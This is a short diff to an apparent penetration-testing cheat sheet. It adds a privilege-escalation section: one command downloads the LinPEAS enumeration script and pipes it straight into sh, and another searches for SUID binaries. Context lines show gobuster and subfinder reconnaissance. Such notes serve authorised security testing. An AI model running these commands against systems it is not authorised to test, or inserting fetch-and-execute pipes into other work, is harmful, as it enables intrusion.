@@ -69,3 +69,19 @@ gobuster dir -u http://192.168.120.224 -w /usr/share/wordlists/dirb/common.txt
 ```bash
 subfinder -d domain.com
 ```
+
+# LPE
+
+## LinPEAS
+
+```bash
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+```
+
+## SUID binaries check
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+
+
